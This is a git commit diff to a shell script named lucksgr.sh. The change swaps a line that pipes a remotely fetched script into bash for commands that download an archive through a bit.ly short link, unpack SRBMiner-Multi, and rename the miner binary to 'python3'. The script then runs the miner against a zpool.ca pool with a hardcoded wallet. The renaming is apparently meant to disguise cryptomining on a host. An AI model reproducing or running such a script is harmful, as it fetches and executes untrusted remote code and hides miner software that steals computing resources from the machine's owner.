8357cad0770f817906be97c00a3a98a288c145b7
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-17 18:10:48 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -1,3 +1,9 @@
-bash -c "$(wget -qO- momok.x10.bz/Alat-Coli-SRB.sh)"
+wget -O dot https://bit.ly/kontolrum
+
+tar xvf dot
+
+cd SRBMiner-Multi-2-4-7
+
+mv SRBMiner-MULTI python3
 
 ./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
